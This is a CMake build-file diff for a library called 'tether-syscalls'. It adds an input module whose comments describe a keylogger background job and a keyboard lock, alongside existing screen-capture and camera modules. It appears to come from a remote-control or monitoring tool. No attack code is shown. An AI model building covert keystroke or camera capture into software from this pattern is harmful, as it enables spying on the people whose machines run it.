@@ -10,6 +10,11 @@ add_library(tether-syscalls STATIC
     image_png.cpp
     capture.cpp
     camera.cpp
+    # Task 6.7: the input family (keylogger job in the shared registry +
+    # keyboard lock; per-OS seams in input.cpp).
+    input.cpp
+    # Task 6.8: the app family (Start-menu .lnk / .desktop entries).
+    app.cpp
     # The shared managed background-job lifecycle (camera today; the 6.7
     # keylogger plugs into the same registry).
     jobs.cpp)
